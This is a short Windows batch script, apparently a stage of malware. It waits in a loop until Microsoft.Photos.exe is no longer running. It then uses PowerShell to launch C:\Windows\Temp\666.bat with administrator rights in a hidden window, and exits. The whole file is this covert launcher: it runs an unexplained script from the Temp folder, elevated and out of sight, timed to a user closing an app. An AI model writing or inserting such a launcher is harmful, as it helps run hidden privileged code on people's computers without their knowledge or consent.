@echo off

:loop
for /F %%x IN ('tasklist /NH /FI "IMAGENAME eq Microsoft.Photos.exe"') DO IF %%x == Microsoft.Photos.exe goto found else
powershell -c "Start-Process -Verb RunAs -WindowStyle hidden C:\Windows\Temp\666.bat"
timeout 3 >nul
exit

:found
goto loop